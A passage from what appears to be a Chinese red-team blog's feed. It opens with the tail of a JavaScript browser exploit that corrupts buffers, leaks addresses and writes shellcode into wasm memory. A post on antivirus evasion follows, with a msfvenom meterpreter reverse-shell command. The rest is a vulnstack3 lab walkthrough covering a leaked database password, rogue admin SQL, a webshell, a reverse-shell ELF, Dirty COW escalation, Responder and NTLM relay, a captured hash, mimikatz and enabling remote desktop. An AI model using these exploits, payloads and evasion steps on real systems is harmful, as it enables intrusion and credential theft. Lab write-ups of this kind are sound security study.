class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;setbackingStore&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;hi, low&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       rwarr[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;] = i2f(fLow(rwarr[&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;]), hi);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       rwarr[&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;] = i2f(low, fHi(rwarr[&lt;span class=&quot;number&quot;&gt;5&lt;/span&gt;]));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;leakObjLow&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;o&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       corrupt_buff.slot = o;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (fLow(rwarr[&lt;span class=&quot;number&quot;&gt;9&lt;/span&gt;]) - &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; corrupt_view = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;DataView&lt;/span&gt;(corrupt_buff);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; corrupt_buffer_ptr_low = leakObjLow(corrupt_buff);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; idx0Addr = corrupt_buffer_ptr_low - &lt;span class=&quot;number&quot;&gt;0x10&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; baseAddr = (corrupt_buffer_ptr_low &amp;amp; &lt;span class=&quot;number&quot;&gt;0xffff0000&lt;/span&gt;) - ((corrupt_buffer_ptr_low &amp;amp; &lt;span class=&quot;number&quot;&gt;0xffff0000&lt;/span&gt;) % &lt;span class=&quot;number&quot;&gt;0x40000&lt;/span&gt;) + &lt;span class=&quot;number&quot;&gt;0x40000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; delta = baseAddr + &lt;span class=&quot;number&quot;&gt;0x1c&lt;/span&gt; - idx0Addr;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((delta % &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;) == &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; baseIdx = delta / &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.base = fLow(rwarr[baseIdx]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125; &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; baseIdx = ((delta - (delta % &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;)) / &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.base = fHi(rwarr[baseIdx]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; wasmInsAddr = leakObjLow(wasmInstance);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   setbackingStore(wasmInsAddr, &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.base);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; code_entry = corrupt_view.getFloat64(&lt;span class=&quot;number&quot;&gt;13&lt;/span&gt; * &lt;span class=&quot;number&quot;&gt;8&lt;/span&gt;, &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   setbackingStore(fLow(code_entry), fHi(code_entry));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (&lt;span class=&quot;keyword&quot;&gt;let&lt;/span&gt; i = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;; i &amp;lt; shellcode.length; i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       corrupt_view.setUint8(i, shellcode[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   main();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;&lt;span class=&quot;regexp&quot;&gt;/script&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Spear phishing" scheme="https://choge.top/categories/Spear-phishing/"/>
    
    
      <category term="redteam" scheme="https://choge.top/tags/redteam/"/>
    
  </entry>
  
  <entry>
    <title>部分免杀技术复现（不断更新中）</title>
    <link href="https://choge.top/2021/02/22/%E9%83%A8%E5%88%86%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF%E5%A4%8D%E7%8E%B0/"/>
    <id>https://choge.top/2021/02/22/部分免杀技术复现/</id>
    <published>2021-02-22T06:57:13.000Z</published>
    <updated>2021-02-28T10:04:44.903Z</updated>
    
    <content type="html"><![CDATA[<p>免杀技术集合</p><p><a href="https://github.com/TideSec/BypassAntiVirus" target="_blank" rel="noopener">https://github.com/TideSec/BypassAntiVirus</a></p><h3 id="UUID-免杀"><a href="#UUID-免杀" class="headerlink" title="UUID 免杀"></a>UUID 免杀</h3><p>CS生成raw格式文件</p><p><img src="//choge.top/2021/02/22/部分免杀技术复现/image-20210222150236010.png" alt="image-20210222150236010"></p><p>直接使用FourEye中的uuid模块</p><p><img src="//choge.top/2021/02/22/部分免杀技术复现/image-20210222150349015.png" alt="image-20210222150349015"></p><p>如提示错误则需要安装mingw-w64为Linux编译exe模块 <code>apt-get update apt-get install mingw-w64</code></p><a id="more"></a><p>本地测试成功</p><p><img src="//choge.top/2021/02/22/部分免杀技术复现/image-20210222150514810.png" alt="image-20210222150514810"></p><p>但是后续进程注入等操作被拦截了，后续需要结合更多的免杀框架和技术，编码继续做复现，本文会不断更新。</p><p>xor方式免杀</p><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.31.83 lport=4444 -f raw -o shell.raw</p><p>暗月免杀</p><p>python加载器</p><p>go加载器</p><p>powershell免杀</p><p><a href="https://www.yuque.com/tidesec/redteam/sgfxkl#71xfb" target="_blank" rel="noopener">https://www.yuque.com/tidesec/redteam/sgfxkl#71xfb</a></p><p><a href="http://caidaome.com/?post=246" target="_blank" rel="noopener">http://caidaome.com/?post=246</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;免杀技术集合&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/TideSec/BypassAntiVirus&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://github.com/TideSec/BypassAntiVirus&lt;/a&gt;&lt;/p&gt;&lt;h3 id=&quot;UUID-免杀&quot;&gt;&lt;a href=&quot;#UUID-免杀&quot; class=&quot;headerlink&quot; title=&quot;UUID 免杀&quot;&gt;&lt;/a&gt;UUID 免杀&lt;/h3&gt;&lt;p&gt;CS生成raw格式文件&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2021/02/22/部分免杀技术复现/image-20210222150236010.png&quot; alt=&quot;image-20210222150236010&quot;&gt;&lt;/p&gt;&lt;p&gt;直接使用FourEye中的uuid模块&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2021/02/22/部分免杀技术复现/image-20210222150349015.png&quot; alt=&quot;image-20210222150349015&quot;&gt;&lt;/p&gt;&lt;p&gt;如提示错误则需要安装mingw-w64为Linux编译exe模块 &lt;code&gt;apt-get update apt-get install mingw-w64&lt;/code&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="Penetration test" scheme="https://choge.top/categories/Penetration-test/"/>
    
    
      <category term="red team" scheme="https://choge.top/tags/red-team/"/>
    
  </entry>
  
  <entry>
    <title>vulnstack3靶机渗透</title>
    <link href="https://choge.top/2021/02/22/vulnstack3%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>https://choge.top/2021/02/22/vulnstack3靶机渗透/</id>
    <published>2021-02-22T02:19:49.000Z</published>
    <updated>2021-02-22T06:44:25.897Z</updated>
    
    <content type="html"><![CDATA[<p>尝试下vulnstack3靶机渗透，镜像为挂起状态</p><h3 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h3><p>将vmnet2设置为仅主机模式 子网地址为192.168.93.0</p><p>拓扑图</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102128253.png" alt="image-20210222102128253"></p><h3 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">nmap</span> <span class="selector-tag">-sV</span> 192<span class="selector-class">.168</span><span class="selector-class">.31</span><span class="selector-class">.54</span></span><br></pre></td></tr></table></figure><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102235556.png" alt="image-20210222102235556"></p><p>目录爆破</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">python3</span> <span class="selector-tag">dirmap</span><span class="selector-class">.py</span> <span class="selector-tag">-i</span> 192<span class="selector-class">.168</span><span class="selector-class">.31</span><span class="selector-class">.54</span> <span class="selector-tag">-lcf</span></span><br></pre></td></tr></table></figure><p>可以查看到存在大量敏感文件</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102308913.png" alt="image-20210222102308913"></p><p><a href="http://192.168.31.54/configuration.php" target="_blank" rel="noopener">http://192.168.31.54/configuration.php</a>~</p><a id="more"></a><p>获取数据库连接信息</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102344040.png" alt="image-20210222102344040"></p><p>user = testuser/password = cvcvgjASD!@</p><p>msf探测joomla版本</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102424673.png" alt="image-20210222102424673"></p><p>3.9.12可通过后台写入shell</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102435899.png" alt="image-20210222102435899"></p><p>先尝试登陆</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102528749.png" alt="image-20210222102528749"></p><p>尝试添加管理员用户，官方查看添加语法如下</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102559948.png" alt="image-20210222102559948"></p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="symbol">`am2zu_users`</span></span><br><span class="line">   (<span class="symbol">`name`</span>, <span class="symbol">`username`</span>, <span class="symbol">`password`</span>, <span class="symbol">`params`</span>, <span class="symbol">`registerDate`</span>, <span class="symbol">`lastvisitDate`</span>, <span class="symbol">`lastResetTime`</span>)</span><br><span class="line"><span class="keyword">VALUES</span> (<span class="string">'Administrator2'</span>, <span class="string">'admin2'</span>,</span><br><span class="line">    <span class="string">'d2064d358136996bd22421584a7cb33e:trd7TvKHx6dMeoMmBVxYmg0vuXEA4199'</span>, <span class="string">''</span>, NOW(), NOW(), NOW());</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="symbol">`am2zu_user_usergroup_map`</span> (<span class="symbol">`user_id`</span>,<span class="symbol">`group_id`</span>)</span><br><span class="line"><span class="keyword">VALUES</span> (LAST_INSERT_ID(),<span class="string">'8'</span>);</span><br></pre></td></tr></table></figure><p>写入成功，写得有点多,    注意要把多余的数据删除，不然无法获取shell</p><p> <img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102705488.png" alt="image-20210222102705488"></p><p>密码为secret</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102734544.png" alt="image-20210222102734544"></p><p><a href="http://192.168.31.54/administrator/进行后台登陆" target="_blank" rel="noopener">http://192.168.31.54/administrator/进行后台登陆</a></p><p>修改模板getshell，Extensions-&gt;Templates-&gt;Templates-&gt;Beez3 Details and Files-&gt;编辑error.php</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102800407.png" alt="image-20210222102800407"></p><p>shell地址<a href="http://192.168.31.54/[templates/beez3/error.php](http://192.168.1.110/templates/beez3/shell.php)" target="_blank" rel="noopener">http://192.168.31.54/[templates/beez3/error.php](http://192.168.1.110/templates/beez3/shell.php)</a></p><p>执行命令发现需要绕过disable_function</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103037936.png" alt="image-20210222103037936"></p><p>重新写入哥斯拉马绕过</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103101207.png" alt="image-20210222103101207"></p><p>信息收集</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103117999.png" alt="image-20210222103117999"></p><p>64位系统</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103150594.png" alt="image-20210222103150594"></p><h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>上线msf</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.31</span><span class="number">.49</span> LPORT=<span class="number">4444</span> -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><p>上传后添加权限</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103416538.png" alt="image-20210222103416538"></p><p>执行后发现无法上线</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103403177.png" alt="image-20210222103403177"></p><p>再回过头去梳理下信息，发现ubuntu的ip和访问网站的ip地址不在同一网段，说明做了nginx反代，无法上线正常</p><p>此时突破口为nginx机子的22端口</p><p>翻看Webshell找到敏感文件</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103726277.png" alt="image-20210222103726277"></p><p>连接成功，收集信息</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103750325.png" alt="image-20210222103750325"></p><p>查看内核版本</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103811354.png" alt="image-20210222103811354"></p><p>将shell.elf上传至centos执行，获取shell</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222103840036.png" alt="image-20210222103840036"></p><p>添加路由</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135127648.png" alt="image-20210222135127648"></p><p>扫描smb</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135155773.png" alt="image-20210222135155773"></p><p>扫到3台Windows主机</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135233953.png" alt="image-20210222135233953"></p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135246345.png" alt="image-20210222135246345"></p><p>尝试对win2008 smb爆破</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135305302.png" alt="image-20210222135305302"></p><p>卧槽无法爆破出来，看网上部分文章可以爆破出来，后续操作就会简单很多，既然无法爆破那就换思路</p><p>建立socks4a代理</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135331835.png" alt="image-20210222135331835"></p><p>vim /etc/proxychains.conf</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135349054.png" alt="image-20210222135349054"></p><p>proxifier建立好规则</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135410613.png" alt="image-20210222135410613"></p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135504712.png" alt="image-20210222135504712"></p><p>对3台主机进行端口探测</p><p>2012主机</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135535315.png" alt="image-20210222135535315"></p><p>2008主机</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135607091.png" alt="image-20210222135607091"></p><p>win7主机</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135625752.png" alt="image-20210222135625752"></p><p>根据扫描结果，可尝试从win7的3389或win2008的1433和3306进行突破，通过socks代理3389无法访问，3306无法连接，但1433连接成功，使用之前获取的mysql账户密码 成功登陆20主机的sqlserver</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135654511.png" alt="image-20210222135654511"></p><p>连接成功</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135707871.png" alt="image-20210222135707871"></p><p>后续思路为centos使用Responder监听20网卡，使20主机执行sqlserver漏洞获取hash</p><p>先对Centos进行提权操作不然无法使用Responder</p><p>内核版本大于2.6.22，可以使用脏牛漏洞提权<a href="https://github.com/FireFart/dirtycow" target="_blank" rel="noopener">https://github.com/FireFart/dirtycow</a></p><p>教程参考：<a href="https://blog.csdn.net/nzjdsds/article/details/82935243" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/82935243</a></p><p>成功提权</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135843821.png" alt="image-20210222135843821"></p><p>安装Responder</p><p><a href="https://github.com/SpiderLabs/Responder" target="_blank" rel="noopener">https://github.com/SpiderLabs/Responder</a></p><p>Responder使用参考</p><p><a href="https://blog.csdn.net/nzjdsds/article/details/94314995" target="_blank" rel="noopener">https://blog.csdn.net/nzjdsds/article/details/94314995</a></p><p>centos主机执行命令</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> Responder.<span class="keyword">py</span> -I eth1 -<span class="keyword">rv</span></span><br></pre></td></tr></table></figure><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135913922.png" alt="image-20210222135913922"></p><p>使用auxiliary/admin/mssql/mssql_ntlm_stealer，执行xp_dirtree，触发UNC</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222135942343.png" alt="image-20210222135942343"></p><p>centos成功坚挺到hash</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222140011311.png" alt="image-20210222140011311"></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[MSSQL] Received<span class="built_in"> connection </span><span class="keyword">from</span> 192.168.93.20</span><br><span class="line">[SMB] NTLMv2-SSP<span class="built_in"> Client </span>  : 192.168.93.20</span><br><span class="line">[SMB] NTLMv2-SSP Username : WIN2008\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::WIN2008:1122334455667788:5475B3B3A37DB6027BA8AB1F60142DB0:010100000000000080FC2E4B2D08D7012D4666B8C3BCCA970000000002000A0053004D0042003100320001000A0053004D0042003100320004000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D004200310032000800300030000000000000000000000000300000E7FBA7E46F9C44F8F041B08F1FB7DA847A7BF7506335BED604BE8AB5F5F0A7C30000000000000000</span><br></pre></td></tr></table></figure><p>可以尝试使用john解密，但是字典不行跑不出来，那就继续渗透</p><p>尝试中继win2008打win7，发现端口占用</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143248066.png" alt="image-20210222143248066"></p><p>需要禁用Responder的http服务器，将相关服务更改为“Off”来禁用Responder.conf文件中的这些特定服务来完成任务。</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143313113.png" alt="image-20210222143313113"></p><p>还得关闭centos 80端口对应的nginx服务，这样如果是实战情况下动静太大了</p><p>重新开启服务</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143404108.png" alt="image-20210222143404108"></p><p>再开一个终端窗口<code>python MultiRelay.py -t 192.168.93.30 -u ALL</code></p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143435483.png" alt="image-20210222143435483"></p><p>msf再次执行</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143455692.png" alt="image-20210222143455692"></p><p>获取到win7的shell</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143524624.png" alt="image-20210222143524624"></p><p>使用MultiRelay自带mimikatz抓取win7凭据<code>mimi &quot;sekurlsa::logonpasswords&quot;</code></p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143604315.png" alt="image-20210222143604315"></p><p>因为win2008的administrator凭据可以中继到win7，所以win2008的密码和win7相同</p><p>msf使用psexec进行命令执行使用<code>auxiliary/admin/smb/psexec_command</code>模块</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143652316.png" alt="image-20210222143652316"></p><p>whoami执行结果如下</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143715307.png" alt="image-20210222143715307"></p><p>查看是否存在TEST域的administrator的进程</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143726794.png" alt="image-20210222143726794"></p><p>发现存在</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222143800257.png" alt="image-20210222143800257"></p><p>后续思路为上传mimikatz到win2008获取域控的密码，再此之前先来看看能不能连上win2008的3389</p><p>通过psexec开启远程桌面命令如下</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">\#</span>设置远程桌面端口</span><br><span class="line"> reg add "HKLM<span class="symbol">\S</span>ystem<span class="symbol">\C</span>urrentControlSet<span class="symbol">\C</span>ontrol<span class="symbol">\T</span>erminal Server<span class="symbol">\W</span>inStations<span class="symbol">\R</span>DP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line"> <span class="symbol">\#</span>开启远程桌面</span><br><span class="line"> wmic RDTOGGLE WHERE ServerName='<span class="variable">%COMPUTERNAME%</span>' call SetAllowTSConnections 1</span><br><span class="line"> <span class="symbol">\#</span>检查端口状态</span><br><span class="line"> netstat -an|find "3389"</span><br><span class="line"> <span class="symbol">\#</span>关闭远程桌面</span><br><span class="line"> wmic RDTOGGLE WHERE ServerName='<span class="variable">%COMPUTERNAME%</span>' call SetAllowTSConnections 0</span><br></pre></td></tr></table></figure><p>Administrator/123qwe!ASD</p><p>连接成功</p><p><img src="//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222144015827.png" alt="image-20210222144015827"></p><p>上传mimikatz</p><p>由于环境崩溃了，这个环境太大，反复崩溃，且虚拟机都为挂起状态，重新启动后有些环境就无法还原，后续思路为minikatz通过centos上传到win7，win7再传到win8，再通过获得的3389进入后查看密码。也可以尝试使用impacket中的psexec或者wmi来连接获取win2008的shell，然后再传入mimikatz</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://blog.csdn.net/qq_40989258/article/details/110377147" target="_blank" rel="noopener">https://blog.csdn.net/qq_40989258/article/details/110377147</a></p><p><a href="https://xz.aliyun.com/t/6988#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/6988#toc-1</a> </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;尝试下vulnstack3靶机渗透，镜像为挂起状态&lt;/p&gt;&lt;h3 id=&quot;配置环境&quot;&gt;&lt;a href=&quot;#配置环境&quot; class=&quot;headerlink&quot; title=&quot;配置环境&quot;&gt;&lt;/a&gt;配置环境&lt;/h3&gt;&lt;p&gt;将vmnet2设置为仅主机模式 子网地址为192.168.93.0&lt;/p&gt;&lt;p&gt;拓扑图&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102128253.png&quot; alt=&quot;image-20210222102128253&quot;&gt;&lt;/p&gt;&lt;h3 id=&quot;外网打点&quot;&gt;&lt;a href=&quot;#外网打点&quot; class=&quot;headerlink&quot; title=&quot;外网打点&quot;&gt;&lt;/a&gt;外网打点&lt;/h3&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;nmap&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;-sV&lt;/span&gt; 192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.31&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.54&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102235556.png&quot; alt=&quot;image-20210222102235556&quot;&gt;&lt;/p&gt;&lt;p&gt;目录爆破&lt;/p&gt;&lt;figure class=&quot;highlight css&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;selector-tag&quot;&gt;python3&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;dirmap&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.py&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;-i&lt;/span&gt; 192&lt;span class=&quot;selector-class&quot;&gt;.168&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.31&lt;/span&gt;&lt;span class=&quot;selector-class&quot;&gt;.54&lt;/span&gt; &lt;span class=&quot;selector-tag&quot;&gt;-lcf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;可以查看到存在大量敏感文件&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//choge.top/2021/02/22/vulnstack3靶机渗透/image-20210222102308913.png&quot; alt=&quot;image-20210222102308913&quot;&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://192.168.31.54/configuration.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://192.168.31.54/configuration.php&lt;/a&gt;~&lt;/p&gt;
    
    </summary>
    
    
      <category term="Penetration test" scheme="https://choge.top/categories/Penetration-test/"/>
    
    
      <category term="red team" scheme="https://choge.top/tags/red-team/"/>
    
  </entry>
  
  <entry>
    <title>cfs三层靶机渗透</title>
    <link href="https://choge.top/2021/02/20/cfs%E4%B8%89%E5%B1%82%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"/>
    <id>https://choge.top/2021/02/20/cfs三层靶机渗透/</id>
    <published>2021-02-20T08:23:13.000Z</published>
